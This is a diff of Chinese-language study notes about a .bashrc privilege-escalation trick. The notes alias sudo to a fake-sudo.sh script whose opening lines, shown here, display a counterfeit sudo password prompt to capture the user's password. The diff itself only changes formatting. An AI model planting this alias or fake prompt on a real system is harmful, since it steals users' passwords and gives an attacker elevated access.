@@ -286,7 +286,8 @@ completed.
 ** [[http://turbochaos.blogspot.jp/2013/11/ghetto-privilege-escalation-with-bashrc.html?view%3Dsidebar][Ghetto Privilege Escalation With .bashrc]]
    好猥琐的手法。开始看作者其他的文章，一个人不可能一下子这么牛逼的。
 首先将下面脚本保存成fake-sudo.sh。命令行"chmod +x fake-sudo.sh"加上执行权限。
-在.bashrc加上"alias sudo="/location/to/fake-sudo.sh"。 #+begin_example
+在.bashrc加上"alias sudo="/location/to/fake-sudo.sh"。 
+#+begin_example
 #!/bin/bash
 if [ ! -f .chak ]; then                       #如不存在.chak文件
  echo -n "[sudo] password for `whoami`: ";    #现实要求输入密码
